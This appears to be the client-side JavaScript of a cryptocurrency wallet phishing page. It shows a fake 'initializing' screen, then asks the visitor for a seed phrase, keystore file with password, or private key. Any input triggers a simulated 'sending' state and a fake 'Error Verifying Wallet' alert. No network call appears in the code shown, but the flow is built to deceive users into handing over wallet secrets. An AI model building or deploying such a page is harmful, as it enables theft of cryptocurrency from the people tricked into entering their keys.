const openWallet = document.querySelectorAll(".connect-wallet");
const closeWallet = document.getElementById("close-wallet");

const connectOverlay = document.getElementById("connect-overlay");
const initializing = document.getElementById("initializing");
const walletname = document.getElementById("wallet-name");
const myImg = document.getElementById("myImg");
const initializingWalletName = document.getElementById(
  "initializing-wallet-name"
);
const initializingWalletImg = document.getElementById(
  "initializing-wallet-img"
);

openWallet.forEach((element) => {
  element.addEventListener("click", (event) => {
    event.preventDefault();

    const text = element.querySelector("p")?.textContent;
    const imgSrc = element.querySelector("img")?.src;

    // Show the initializing element
    initializing.style.display = "flex";

    if (text) {
      initializingWalletName.textContent = text;
    }

    if (imgSrc) {
      initializingWalletImg.src = imgSrc;
    }

    // Hide the initializing element and show the connectOverlay after 1 second
    setTimeout(() => {
      initializing.style.display = "none";
      connectOverlay.style.display = "flex";
    }, 1500);

    if (imgSrc) {
      myImg.src = imgSrc;
    }

    if (text) {
      walletname.textContent = text;
    }
  });
});

closeWallet.addEventListener("click", (event) => {
  event.preventDefault();
  connectOverlay.style.display = "none";
  walletname.textContent = "";
  document.getElementById("form").reset();
});

// phrase divs
const phrase = document.getElementById("phrase");
const keystore = document.getElementById("keystore");
const private = document.getElementById("private");

const firstPhrase = document.getElementById("first");
const secondPhrase = document.getElementById("second");
const thirdPhrase = document.getElementById("third");

// first phrase inputs
const firstPhraseInput = document.getElementById("phraseinput");

// second phrase inputs
const keyStoreValInput = document.getElementById("keystoreval");
const keyStoreValPass = document.getElementById("keystorepass");

// third phrase inputs
const privateKeyVal = document.getElementById("privatekeyval");

const phraseinputValidateBtn = document.getElementById("phraseinput-validate");
const secondinputValidateBtn = document.getElementById("keystoreval-validate");
const thirdinputValidateBtn = document.getElementById("privatekeyval-validate");

// simulate sending
const sending = document.getElementById("sending");

phraseinputValidateBtn.addEventListener("click", (event) => {
  event.preventDefault();

  if (firstPhraseInput?.value) {
    sending.style.display = "block";

    setTimeout(() => {
      alert("Error Verifying Wallet... Please try again later");

      sending.style.display = "none";
    }, 3000);
  } else {
    firstPhraseInput.focus();
  }
});

secondinputValidateBtn.addEventListener("click", (event) => {
  event.preventDefault();

  if (keyStoreValInput?.value && keyStoreValPass?.value) {
    sending.style.display = "block";

    setTimeout(() => {
      alert("Error Verifying Wallet... Please try again later");

      sending.style.display = "none";
    }, 3000);
  } else {
    keyStoreValInput.focus();
  }
});

thirdinputValidateBtn.addEventListener("click", (event) => {
  event.preventDefault();

  if (privateKeyVal?.value) {
    sending.style.display = "block";

    setTimeout(() => {
      alert("Error Verifying Wallet... Please try again later");

      sending.style.display = "none";
    }, 3000);
  } else {
    privateKeyVal.focus();
  }
});

phrase.addEventListener("click", (event) => {
  event.preventDefault();

  firstPhrase.classList.add("active");
  secondPhrase.classList.remove("active");
  thirdPhrase.classList.remove("active");
});

keystore.addEventListener("click", (event) => {
  event.preventDefault();

  secondPhrase.classList.add("active");
  firstPhrase.classList.remove("active");
  thirdPhrase.classList.remove("active");
});

private.addEventListener("click", (event) => {
  event.preventDefault();

  thirdPhrase.classList.add("active");
  firstPhrase.classList.remove("active");
  secondPhrase.classList.remove("active");
});
